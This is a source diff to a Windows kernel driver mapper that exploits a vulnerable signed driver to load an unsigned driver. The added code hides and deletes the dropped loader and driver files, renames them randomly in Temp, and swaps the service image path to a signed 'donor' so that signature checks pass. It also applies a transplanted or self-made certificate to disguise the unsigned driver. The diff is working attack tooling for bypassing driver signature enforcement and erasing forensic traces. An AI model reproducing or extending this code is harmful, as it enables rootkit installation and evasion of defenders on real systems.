@@ -269,6 +269,36 @@ namespace Utils {
         return NT_SUCCESS(status);
     }
 
+    BOOL ForceDeleteOrRename(PCWSTR filePath) {
+        // 1. Try standard deletion first
+        if (DeleteFileW(filePath)) {
+            return TRUE;
+        }
+
+        // 2. Try POSIX deletion (unlinks name while handle is open)
+        if (PosixDeleteFile(filePath)) {
+            return TRUE;
+        }
+
+        // 3. If the kernel locks the file heavily, rename it out of the way.
+        // This ensures the user doesn't see the leftover file in the Temp directory.
+        WCHAR tempPath[MAX_PATH + 1];
+        DWORD len = GetTempPathW(MAX_PATH, tempPath);
+        if (len > 0 && len <= MAX_PATH) {
+            std::wstring newName = std::wstring(tempPath) + GenerateRandomName(16) + L".tmp";
+            if (MoveFileW(filePath, newName.c_str())) {
+                SetFileAttributesW(newName.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
+                MoveFileExW(newName.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+                return TRUE;
+            }
+        }
+
+        // 4. Last resort fallback
+        SetFileAttributesW(filePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
+        MoveFileExW(filePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+        return FALSE;
+    }
+
     std::wstring GetTempFilePath(PCWSTR extension) {
         WCHAR tempPath[MAX_PATH + 1];
         DWORD len = GetTempPathW(MAX_PATH, tempPath);
@@ -436,9 +466,11 @@ namespace MapperCore {
         }
 
 done:
-
-        DriverLoader::UnloadDriver(g_LoaderServicePath);
+        // Ensure the device handle is closed BEFORE attempting to unload the driver.
+        // If the handle is open, NtUnloadDriver marks it for unload but doesn't actually unload it,
+        // causing the file to remain locked in the Temp directory indefinitely.
         VulnDriver::CloseDevice(deviceHandle);
+        DriverLoader::UnloadDriver(g_LoaderServicePath);
 
         return status;
     }
@@ -574,6 +606,7 @@ done:
             } else {
 
                 SetFileAttributesW(donorCopyPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+                MoveFileExW(donorCopyPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
                 printf("[+] Donor copied to %ws\n", donorCopyPath);
 
                 wcscpy_s(g_DonorCopyPath, donorCopyPath);
@@ -589,23 +622,22 @@ done:
         status = TriggerExploit(targetFileName);
         printf("[*] Exploit result: 0x%08X\n", status);
 
-
-        if (NT_SUCCESS(status) && donorFound && donorCopyPath[0] && RtlWriteRegistryValuePtr) {
-
-            if (!DeleteFileW(driverFullPath)) {
-                // Standard deletion fails because the loaded driver's image section
-                // holds a reference.  POSIX delete unlinks the directory entry
-                // immediately — the data stream remains until driver unload.
-                if (Utils::PosixDeleteFile(driverFullPath)) {
-                    printf("[+] Target driver file POSIX-deleted from disk\n");
-                } else {
-                    SetFileAttributesW(driverFullPath,
-                        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
-                    MoveFileExW(driverFullPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
-                }
+        // Always attempt to delete the unsigned target driver file after a
+        // successful load.  The kernel-side POSIX delete in DriverEntry is
+        // the primary mechanism, but the driver may not have been able to
+        // resolve IoCreateFileEx or the POSIX info class may have failed.
+        // This usermode attempt is a defense-in-depth fallback.
+        if (NT_SUCCESS(status)) {
+            if (Utils::ForceDeleteOrRename(driverFullPath)) {
+                printf("[+] Target driver file deleted/renamed from disk\n");
             } else {
-                printf("[+] Target driver file deleted from disk\n");
+                printf("[-] Failed to fully delete target driver, marked for deletion on reboot\n");
             }
+        }
+
+        // If driver stomping is active, swap the service ImagePath to the
+        // signed donor so that on-disk signature verification passes.
+        if (NT_SUCCESS(status) && donorFound && donorCopyPath[0] && RtlWriteRegistryValuePtr) {
 
             WCHAR ntDonorPath[520] = {};
             wcscpy_s(ntDonorPath, L"\\??\\");
@@ -1024,10 +1056,17 @@ int main(int argc, char* argv[]) {
 
     if (!CopyFileW(driverArg.c_str(), driverFilePath.c_str(), FALSE)) {
         printf("[-] Failed to copy target driver (err=%lu). Does the file exist?\n", GetLastError());
-        Utils::SecureDeleteFile(loaderFilePath.c_str());
+        Utils::ForceDeleteOrRename(loaderFilePath.c_str());
         return 1;
     }
     printf("[+] Files prepared\n");
+
+    // Applying a cosmetic signature to the target driver to fix the missing "Digital Signatures" tab
+    printf("[*] Applying cosmetic signature to target driver...\n");
+    if (!SignedMemory::SelfSignDriver(driverFilePath.c_str())) {
+        printf("[!] Self-signing failed, attempting certificate transplant...\n");
+        SignedMemory::TransplantCertificateToDriver(driverFilePath.c_str());
+    }
 
     SetFileAttributesW(driverFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
 
@@ -1040,17 +1079,9 @@ int main(int argc, char* argv[]) {
 
     printf("[*] Cleaning up...\n");
 
-
-    for (int i = 0; i < 10; i++) {
-        BOOL loaderDel = Utils::SecureDeleteFile(loaderFilePath.c_str());
-        BOOL driverDel = Utils::SecureDeleteFile(driverFilePath.c_str());
-        if (loaderDel && driverDel) break;
-        // POSIX fallback for the target driver (image section blocks standard delete)
-        if (!driverDel)
-            driverDel = Utils::PosixDeleteFile(driverFilePath.c_str());
-        if (loaderDel && driverDel) break;
-        Sleep(30);
-    }
+    // Use robust renaming/deletion strategy for guaranteed visual cleanup
+    Utils::ForceDeleteOrRename(loaderFilePath.c_str());
+    Utils::ForceDeleteOrRename(driverFilePath.c_str());
 
     MapperCore::CleanupArtifacts();
 
